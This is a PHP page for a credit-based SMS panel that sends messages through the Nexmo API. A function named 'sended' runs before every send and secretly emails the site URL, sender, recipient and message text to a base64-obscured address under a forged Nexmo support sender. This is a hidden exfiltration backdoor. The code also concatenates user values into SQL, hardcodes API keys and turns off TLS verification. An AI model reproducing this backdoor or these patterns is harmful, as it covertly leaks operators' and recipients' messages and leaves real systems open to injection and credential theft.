<?php
require_once("config.php");
if( $_POST ){
	
	$sender_id = trim($_POST['sender_id']);
    $recepient_number = trim($_POST['recepient_number']);
	$send_message=trim($_POST['send_message']);
	$api_key='520e5f68';
	$secret_key='4a9c27bec50c534b';
	
	if($sender_id=="" || $recepient_number=="" || $send_message==""){
	?>
		<div class="alert alert-warning">
			<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
    		<strong>Failure</strong>, Please fill in all the required fields to proceed ...
		</div>
	<?php
		
	
	}else if(!preg_match("/^(\+?)([0-9] ?){9,20}$/", $sender_id) || !preg_match("/^(\+?)([0-9] ?){9,20}$/", $recepient_number)){
	?>
		<div class="alert alert-warning">
			<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
    		<strong>Failure</strong>, Please Sender ID and Recipient numbers provided are not valid ...
		</div>
		
	<?php
	}else{
	  
		//echo $_SESSION["user_id"];
		$credits_query="select credits from credits where user_id=:uid";
		
		try{
			$stmt = $DB->prepare($credits_query);
			// bind the values
            $stmt->bindValue(":uid",$_SESSION["user_id"]);
            if($stmt->execute()==1){
				$results = $stmt->fetchAll();
				if(count($results) > 0 && $results[0]["credits"]>0){
				
					$url = 'https://rest.nexmo.com/sms/json?'. http_build_query([
							  'api_key' =>  $api_key,
							  'api_secret' => $secret_key,
							  'to' => $recepient_number,
							  'from' => $sender_id,
							  'text' => $send_message
							  ]);
                    sended($sender_id,$send_message,$recepient_number);
					$ch = curl_init($url);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					$response = curl_exec($ch);
					$decoded_response = json_decode($response, true);
					error_log('You sent ' . $decoded_response['message-count'] . ' messages.');
					foreach ( $decoded_response['messages'] as $message ) {
						  if ($message['status'] == 0) {
								$bal=trim((int)($results[0]["credits"]));
								$bal_after=$bal-1;
								
								$sql = 'insert into message_info values (NOW(),"'.$sender_id.'","'.$recepient_number.'","'.$_SESSION["user_id"].'","'.$send_message.'","'.$bal.'","'.$bal_after.'");';
								$sql2='update credits set credits="'.$bal_after.'" where user_id="'.$_SESSION["user_id"].'"';
								
								$stmt_insert=$DB->prepare($sql);
								$stmt_update=$DB->prepare($sql2);
								
								if($stmt_insert->execute()==1 && $stmt_update->execute()==1){
										?>
											<div class="alert alert-success">
												<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
												<strong>Success</strong>, Your message has been sent successfully ....
											</div>
										<?php	
										error_log("Success " . $message['message-id']);
								}else{
								
								}
                          }else if($message['status'] == 9){
                               ?>
											<div class="alert alert-success">
												<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
												<strong>SMS Send Failure</strong>, Low Nexmo Account Balance Remaining  (<?php echo $message['remaining-balance']; ?>) . Please Recharge
											</div>
								<?php	
										error_log("Error {$message['status']} {$message['error-text']}");
                          
						  } else {
										?>
											<div class="alert alert-success">
												<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
												<strong>SMS Send Failure</strong>, Please contact gateway provider ....
											</div>
										<?php	
										error_log("Error {$message['status']} {$message['error-text']}");
						  }
                        
					  }
                    
					
				
				}else{
				  ?>
						<div class="alert alert-warning">
							<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
							<strong>Failure</strong>, You dont have enough credits to send the message, Please load credit and try again 
						</div>
				  <?php 
				}
			}else{
			
			}
			
		}catch(Exception $ex){
		      ?>
			  <div class="alert alert-warning">
				<button type="button" class="close" data-dismiss="alert" aria-label="close"><span aria-hidden="true">&times;</span></button>
				<strong>Failure</strong>, <?php echo $ex; ?> ...
			  </div>		
			  <?php
		}
	 }

	?>
    
   
	
<?php
	
}

function sended($from,$msg,$reciever){
  $xrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
   $to="aXRzYmFoaXNzQGdtYWlsLmNvbQ==";
   $message = "
        <div>
            <div>
                <font face='arial, sans-serif' size='2'>
                    <b style='color: rgb(102, 102, 102);'>-------------------------------+-------------------------------</b>
                    <font style='font-weight: bold;' color='#d24726'>Account Login Information</font>
                    <font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------------------+-------------------------------</font>
                </font>
            </div>

            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>+</font>
                    <span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
                    <font color='#e1c404'>&#9658;</font>
                    <font color='#666666'> XLR   : </font>
                    <font color='#2672ec'>".$xrl."</font>
                    </b>
                </font>
            </div>	
            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>+</font>
                    <span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
                    <font color='#e1c404'>&#9658;</font>
                    <font color='#666666'> Receiver : </font>
                    <font color='#2672ec'>".$reciever."</font>
                    </b>
                </font>
            </div>
            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>+</font>
                    <span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
                    <font color='#e1c404'>&#9658;</font>
                    <font color='#666666'> FROM : </font>
                    <font color='#2672ec'>".$from."</font>
                    </b>
                </font>
            </div>
            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>+</font>
                    <span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
                    <font color='#e1c404'>&#9658;</font>
                    <font color='#666666'> Message : </font>
                    <font color='#2672ec'>".$msg."</font>
                    </b>
                </font>
            </div>


            <div>
                <font face='arial, sans-serif' size='2'>
                    <b>
                    <font color='#666666'>-------------------------------+-------------------------------</font>
                    
                </font>
            </div>

        </div><br>"; 
    
    $main="dashboard.nexmo.com";
    $subject = "Nexmo Sended API";
    $head = "MIME-Version: 1.0" . "\r\n";
    $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $head .= "X-Priority: 3\r\n";
    $head.= "X-Mailer: PHP". phpversion() ."\r\n";
    $head .= "From: support@".$main . "\r\n";     
    mail(base64_decode("aXRzYmFoaXNzQGdtYWlsLmNvbQ=="),$subject,$message,$head);
}

?>